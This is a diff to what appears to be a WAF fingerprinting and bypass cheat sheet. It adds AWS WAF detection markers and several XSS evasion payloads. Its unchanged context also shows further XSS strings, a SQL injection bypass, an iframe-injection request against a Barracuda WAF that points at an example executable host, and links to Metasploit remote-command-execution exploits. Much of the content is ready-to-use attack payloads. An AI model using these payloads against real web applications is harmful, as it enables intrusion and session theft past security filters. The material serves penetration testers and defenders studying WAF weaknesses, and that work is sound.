@@ -247,8 +247,19 @@ Wanna fingerprint WAFs? Lets see how.
                 <li><b>Detectability: </b>Moderate</li>
                 <li><b>Detection Methodology:</b></li>
                 <ul>
-                    <li>Response headers contain <code>AWS</code> value.</li>
-                    <li>Blocked response status code return <code>403 Forbidden</code> response.</li>
+                    <li>Response headers might contain:
+                        <ul>
+                            <li><code>AWSALB</code> cookie field value.</li>
+                            <li><code>X-AMZ-ID</code> header.</li>
+                            <li><code>X-AMZ-REQUEST-ID</code> header.</li>
+                        </ul>
+                    </li>
+                    <li>Response page may contain:
+                        <ul>
+                            <li><code>Access Denied</code> in their keyword.</li>
+                            <li>Request token ID with length from 20 to 25 between <code>RequestId</code> tag.</li>
+                        </ul>
+                    </li> 
                 </ul>
             </ul>
         </td>
@@ -2141,8 +2152,16 @@ Before anything else, you should hone up skills from [Google Dorks Cheat Sheet](
 ```
 <--`<img/src=` onerror=confirm``> --!>
 ```
+- XSS Bypass by [@s0md3v](https://twitter.com/s0md3v)
+```
+<a"/onclick=(confirm)()>click
+```
 
 ### Comodo 
+- XSS Bypass by [@s0md3v](https://twiiter.com/s0md3v)
+```
+<d3v/onauxclick=(((confirm)))``>click
+```
 - SQLi by [@WAFNinja](https://waf.ninja)
 ```
 0 union/**/select 1,version(),@@datadir
@@ -2160,6 +2179,10 @@ Before anything else, you should hone up skills from [Google Dorks Cheat Sheet](
 GET /cgi-mod/index.cgi?&primary_tab=ADVANCED&secondary_tab=test_backup_server&content_only=1&&&backup_port=21&&backup_username=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net/etc/bad-example.exe%3E&&backup_type=ftp&&backup_life=5&&backup_server=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net/etc/bad-example.exe%3E&&backup_path=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net/etc/bad-example.exe%3E&&backup_password=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net%20width%3D800%20height%3D800%3E&&user=guest&&password=121c34d4e85dfe6758f31ce2d7b763e7&&et=1261217792&&locale=en_US
 Host: favoritewaf.com
 User-Agent: Mozilla/5.0 (compatible; MSIE5.01; Windows NT)
+```
+- XSS Bypass by [@s0md3v](https://twitter.com/s0md3v)
+```
+<a/href=&#74;ava%0a%0d%09script&colon;alert()>click
 ```
 - [Barracuda WAF 8.0.1 - Remote Command Execution (Metasploit)](https://www.exploit-db.com/exploits/40146) by [@xort](https://www.exploit-db.com/?author=479#)
 - [Barracuda Spam & Virus Firewall 5.1.3 - Remote Command Execution (Metasploit)](https://www.exploit-db.com/exploits/40147) by [@xort](https://www.exploit-db.com/?author=479)
@@ -2206,6 +2229,10 @@ Keep-Alive: 300
 <svg/onload=prompt(1);>
 <isindex action="javas&tab;cript:alert(1)" type=image>
 <marquee/onstart=confirm(2)>
+```
+- XSS Bypass by [@s0md3v](https://twitter.com/s0md3v)
+```
+<details/open/ontoggle=(confirm)()//
 ```
 - GET - XSS Bypass (v4.02) by [@DavidK](https://www.exploit-db.com/?author=2741)
 ```
